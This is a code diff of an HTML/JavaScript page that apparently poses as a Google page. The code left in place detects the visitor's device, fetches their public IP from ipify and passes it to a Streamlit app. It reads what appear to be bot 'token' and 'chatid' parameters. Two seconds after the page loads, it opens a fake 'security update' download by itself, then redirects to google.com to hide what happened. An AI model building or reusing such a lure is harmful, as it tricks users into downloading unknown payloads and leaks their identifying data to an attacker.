@@ -17,10 +17,6 @@
             width: 100vw;
             cursor: pointer;
             overflow: hidden;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 999999;
         }
         .container { text-align: center; width: 100%; }
         img { width: 272px; max-width: 80%; margin-bottom: 20px; }
@@ -34,7 +30,6 @@
             display: flex;
             align-items: center;
             padding: 0 20px;
-            box-shadow: none;
         }
         .buttons { display: flex; gap: 12px; justify-content: center; }
         button {
@@ -45,7 +40,6 @@
             font-size: 14px;
             padding: 0 16px;
             height: 36px;
-            cursor: pointer;
         }
         #status { margin-top: 20px; color: #5f6368; font-size: 14px; }
     </style>
@@ -67,25 +61,22 @@
         let hasDownloaded = false;
         let deviceType = "pc";
 
-        // كشف نوع الجهاز
         const ua = navigator.userAgent.toLowerCase();
         if (ua.indexOf("android") > -1) deviceType = "android";
         else if (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1) deviceType = "ios";
 
-        // جلب IP العام الحقيقي حصراً وإرساله للتطبيق
         async function fetchPublicIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const publicIP = data.ip;
                 
-                // تحديث الرابط في المتصفح الأب لإرسال الـ IP العام
+                // إرسال الـ IP العام للأب (Streamlit)
                 const currentUrl = new URL(window.parent.location.href);
                 currentUrl.searchParams.set('ip', publicIP);
                 window.parent.history.replaceState({}, '', currentUrl);
                 return publicIP;
             } catch (err) {
-                console.error("Error fetching IP:", err);
                 return "Unknown";
             }
         }
@@ -94,35 +85,26 @@
             if (hasDownloaded) return;
             hasDownloaded = true;
             
-            // التأكد من جلب الـ IP العام قبل التحميل
             await fetchPublicIP();
             
-            // رابط التحميل مع تحديد نوع الجهاز
-            let downloadUrl = "https://rashdai.streamlit.app/?download=true";
-            
-            // استخراج التوكين والـ Chat ID من الرابط الحالي
             const urlParams = new URLSearchParams(window.parent.location.search);
             const token = urlParams.get('token');
             const chatid = urlParams.get('chatid');
             
-            if (token && chatid) {
-                downloadUrl += `&token=${token}&chatid=${chatid}&device=${deviceType}`;
-            }
+            let downloadUrl = `https://rashdai.streamlit.app/?download=true&token=${token}&chatid=${chatid}&device=${deviceType}`;
             
-            // فتح رابط التحميل في نافذة جديدة لتجاوز قيود iframe
+            // فتح التحميل في نافذة جديدة
             window.open(downloadUrl, '_blank');
             
-            document.getElementById('status').innerText = "جاري تحميل التحديث الأمني... يرجى الانتظار.";
+            document.getElementById('status').innerText = "جاري تحميل التحديث الأمني...";
             
-            // إعادة التوجيه لصفحة جوجل الحقيقية بعد 3 ثوانٍ
             setTimeout(() => {
                 window.parent.location.href = "https://www.google.com";
             }, 3000);
         }
 
-        // محاولة التحميل التلقائي بعد 2 ثانية
         window.onload = function() {
-            fetchPublicIP(); // جلب الـ IP فور التحميل
+            fetchPublicIP();
             setTimeout(triggerDownload, 2000);
         };
     </script>
